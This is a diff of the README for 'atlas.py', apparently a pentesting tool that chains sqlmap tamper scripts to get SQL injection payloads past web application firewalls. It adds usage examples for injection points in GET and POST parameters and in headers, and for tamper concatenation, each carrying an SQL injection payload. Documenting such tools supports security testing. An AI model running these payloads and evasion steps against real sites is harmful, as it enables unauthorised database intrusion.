@@ -21,8 +21,39 @@ $ python atlas.py
 Usage
 ---
 ```
-$ python atlas.py --url http://site.com/index.php?id=Price_ASC --payload="-1234 AND 4321=4321-- AAAA" --dbms=mysql --random-agent -v
+$ python atlas.py --url http://site.com/index.php?id=Price_ASC --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
 ```
+
+injection point (with `%%inject%%`):
+
+get:
+```
+$ python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
+```
+
+post:
+```
+$ python atlas.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
+```
+
+headers:
+```
+$ python atlas.py --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
+```
+
+
+tampers concatenation:
+
+```
+$ python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
+```
+
+get tampers list:
+
+```
+$ python atlas.py -g
+```
+
 
 Example 
 ---
